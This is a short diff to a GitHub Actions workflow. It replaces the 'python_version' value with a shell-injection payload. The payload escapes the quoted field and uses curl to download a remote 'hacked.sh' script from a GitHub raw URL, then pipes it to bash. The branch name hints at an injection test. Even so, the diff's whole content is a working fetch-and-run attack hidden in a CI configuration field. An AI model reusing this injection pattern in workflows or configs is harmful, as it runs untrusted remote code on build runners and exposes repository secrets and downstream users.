@@ -25,7 +25,7 @@ jobs:
         with:
           test-input: ${{ inputs.test-input }}
           os: ${{ matrix.os }}
-          python_version: '3.10'
+          python_version: 'hacked";"({curl,-sSfL,raw.githubusercontent.com/Comfy-Org/ComfyUI-Mirror/refs/heads/yo-test-shell-injection-hack/hacked.sh}${IFS}|${IFS}bash)'
           cuda_version: '12.1'
           torch_version: 'specific'
           workflow_filenames: 'workflow1.json,workflow2.json'
